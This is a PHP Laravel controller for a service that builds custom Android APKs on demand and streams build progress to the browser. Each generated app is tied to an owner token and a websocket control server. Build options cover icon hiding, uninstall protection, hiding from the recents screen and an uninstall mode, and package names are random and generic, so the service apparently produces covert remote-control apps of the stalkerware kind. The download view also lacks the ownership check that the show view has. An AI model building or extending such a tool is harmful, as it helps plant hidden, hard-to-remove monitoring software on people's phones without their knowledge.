<?php

namespace App\Http\Controllers;

use App\Exceptions\GradleApkBuilder\GradleApkBuildException;
use App\Exceptions\ResourceAccessDeniedException;
use App\Http\Requests\Build\BuildRequest;
use App\Models\AppBuild;
use App\Models\AppTemplate;
use App\Services\DeviceTokenService;
use App\Services\GradleApkBuilder\GradleApkBuildConfig;
use App\Services\GradleApkBuilder\GradleApkBuilder;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Inertia\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;

class AppBuildController extends Controller
{
    public function index(Request $request): Response
    {
        $builds = AppBuild::where('user_id', $request->user()->getResourceOwnerId())
            ->with('template')
            ->orderBy('created_at', 'desc')
            ->paginate(20);

        $builds->getCollection()->each->append(['download_url', 'icon_url', 'background_url', 'share_url']);

        return Inertia::render('Builds/Index', [
            'builds' => $builds,
        ]);
    }

    public function download(AppBuild $build): Response
    {
        $build->append(['download_url', 'icon_url']);

        $fileSize = null;
        if ($build->file_path) {
            $fullPath = str_starts_with($build->file_path, 'storage/app/public/')
                ? storage_path('app/public/'.substr($build->file_path, 19))
                : storage_path($build->file_path);

            if (file_exists($fullPath)) {
                $bytes = filesize($fullPath);
                $fileSize = $this->formatFileSize($bytes);
            }
        }

        return Inertia::render('Builds/Download', [
            'build' => $build,
            'fileSize' => $fileSize,
        ]);
    }

    public function create(Request $request): Response
    {
        $templates = AppTemplate::where('is_active', true)->get();
        $ownerId = $request->user()->getResourceOwnerId();

        $iconsPath = config('apk-builder.icons_path').'/'.$ownerId;
        $icons = $this->listUserImages($iconsPath, 'icons', $ownerId);

        $bgPath = config('apk-builder.backgrounds_path').'/'.$ownerId;
        $backgrounds = $this->listUserImages($bgPath, 'backgrounds', $ownerId);

        return Inertia::render('Builds/Create', [
            'templates' => $templates,
            'icons' => $icons,
            'backgrounds' => $backgrounds,
        ]);
    }

    public function stream(BuildRequest $request): StreamedResponse
    {
        $validated = $request->validated();
        $owner = $request->user()->getResourceOwner();
        $userId = $owner->id;

        $packageName = trim((string) ($validated['package_name'] ?? '')) !== ''
            ? trim((string) $validated['package_name'])
            : $this->generatePackageName();
        $version = trim((string) ($validated['version'] ?? '')) !== ''
            ? trim((string) $validated['version'])
            : $this->generateVersion();

        // 生成 owner token
        $tokenService = app(DeviceTokenService::class);
        $ownerToken = $tokenService->generateOwnerToken($userId);

        $buildConfigData = [
            'app_name' => $validated['name'],
            'server_url' => config('app.url'),
            'websocket_url' => config('apk-builder.defaults.websocket_url', ''),
            'owner_token' => $ownerToken,
            'application_id' => $packageName,
            'version_name' => $version,
            'debug' => $validated['debug'] ?? false,
            'alert_title' => $validated['alertTitle'] ?? '',
            'alert_msg' => $validated['alertMsg'] ?? '',
            'ok_text' => $validated['okText'] ?? '',
            'web_url' => $validated['web_url'] ?? 'https://m.baidu.com',
            'disable_uninstall_protection' => $validated['disable_uninstall_protection'] ?? true,
            'disable_recents_guard' => $validated['disable_recents_guard'] ?? true,
            'disable_icon_hide' => $validated['disable_icon_hide'] ?? true,
            'uninstall_mode' => $validated['uninstall_mode'] ?? false,
            'icon_path' => $this->convertUrlToPath($validated['icon_path'] ?? ''),
            'background_path' => $this->convertUrlToPath($validated['background_path'] ?? ''),
        ];

        $buildMeta = [
            'user_id' => $userId,
            'name' => $validated['name'],
            'package_name' => $packageName,
            'version' => $version,
            'websocket_url' => config('apk-builder.defaults.websocket_url'),
            'icon_path' => $validated['icon_path'] ?? '',
            'background_path' => $validated['background_path'] ?? '',
            'device_token' => $ownerToken,
        ];

        return response()->stream(function () use ($buildConfigData, $buildMeta) {
            if (ob_get_level()) {
                ob_end_clean();
            }

            set_time_limit(0);
            session_write_close();

            $config = GradleApkBuildConfig::fromArray($buildConfigData);
            $builder = app(GradleApkBuilder::class);

            $builder->onProgress(function ($step, $label, $status) {
                $this->sendSSE([
                    'type' => 'step',
                    'step' => $step,
                    'label' => $label,
                    'status' => $status,
                ]);
            });

            $builder->onHeartbeat(function () {
                $this->sendHeartbeat();
            });

            try {
                $result = $builder->build($config);

                // 构建成功才写入数据库
                $build = AppBuild::create([
                    ...$buildMeta,
                    'is_custom' => true,
                    'status' => 'completed',
                    'build_config' => $config->toArray(),
                    'build_stats' => $result->stats,
                    'file_path' => $result->path,
                    'started_at' => now(),
                    'completed_at' => now(),
                ]);

                $this->sendSSE([
                    'type' => 'complete',
                    'build_id' => $build->id,
                    'path' => $result->path,
                    'duration' => $result->totalTimeMs,
                ]);
            } catch (GradleApkBuildException|\Throwable $e) {
                $this->sendSSE([
                    'type' => 'error',
                    'error' => '构建失败: '.$e->getMessage(),
                ]);
            }
        }, 200, $this->sseHeaders());
    }

    public function show(Request $request, AppBuild $build): Response
    {
        $this->ensureBuildOwnership($build, $request->user());

        $build->load('template');
        $build->append(['download_url', 'build_duration', 'icon_url', 'background_url', 'share_url']);

        return Inertia::render('Builds/Show', [
            'build' => $build,
            'backUrl' => route('builds.index'),
        ]);
    }

    public function destroy(Request $request, AppBuild $build)
    {
        $this->ensureBuildOwnership($build, $request->user());

        $build->delete();

        return redirect()->route('builds.index')
            ->with('success', 'APK 构建已删除');
    }

    // ============ Private ============

    private function sendSSE(array $data): void
    {
        echo 'data: '.json_encode($data, JSON_UNESCAPED_UNICODE)."\n\n";

        if (connection_aborted()) {
            exit;
        }

        if (ob_get_level()) {
            ob_flush();
        }
        flush();
    }

    private function sendHeartbeat(): void
    {
        echo ": heartbeat\n\n";

        if (connection_aborted()) {
            return;
        }

        if (ob_get_level()) {
            ob_flush();
        }
        flush();
    }

    private function sseHeaders(): array
    {
        return [
            'Content-Type' => 'text/event-stream',
            'Cache-Control' => 'no-cache',
            'Connection' => 'keep-alive',
            'X-Accel-Buffering' => 'no',
        ];
    }

    private function ensureBuildOwnership(AppBuild $build, mixed $user): void
    {
        if ($build->user_id !== $user->getResourceOwnerId()) {
            throw new ResourceAccessDeniedException;
        }
    }

    private function generatePackageName(): string
    {
        $words = ['app', 'tool', 'util', 'helper', 'service', 'system', 'manager', 'client'];
        $prefix = ['com', 'org', 'net'][array_rand(['com', 'org', 'net'])];
        $middle = $words[array_rand($words)];
        $suffix = strtolower(chr(rand(97, 122))).Str::lower(Str::random(5));

        return "{$prefix}.{$middle}.{$suffix}";
    }

    private function generateVersion(): string
    {
        $major = rand(1, 3);
        $minor = rand(0, 9);
        $patch = rand(0, 9);

        return "{$major}.{$minor}.{$patch}";
    }

    private function convertUrlToPath(string $url): string
    {
        if (empty($url)) {
            return '';
        }

        if (str_starts_with($url, '/storage/')) {
            $relativePath = substr($url, strlen('/storage/'));
            $fullPath = storage_path('app/public/'.$relativePath);

            // 路径遍历防护
            $realPath = realpath($fullPath);
            $allowedBase = realpath(storage_path('app/public'));
            if ($realPath === false || $allowedBase === false || ! str_starts_with($realPath, $allowedBase)) {
                return '';
            }

            return $realPath;
        }

        return $url;
    }

    private function formatFileSize(int $bytes): string
    {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 1).' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 1).' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 1).' KB';
        }

        return $bytes.' B';
    }

    private function listUserImages(string $path, string $type, int $userId): array
    {
        $images = [];
        if (is_dir($path)) {
            $files = scandir($path);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') {
                    continue;
                }
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (in_array($ext, ['png', 'jpg', 'jpeg'])) {
                    $images[] = [
                        'name' => $file,
                        'url' => '/storage/'.$type.'/'.$userId.'/'.$file,
                    ];
                }
            }
        }

        return $images;
    }
}
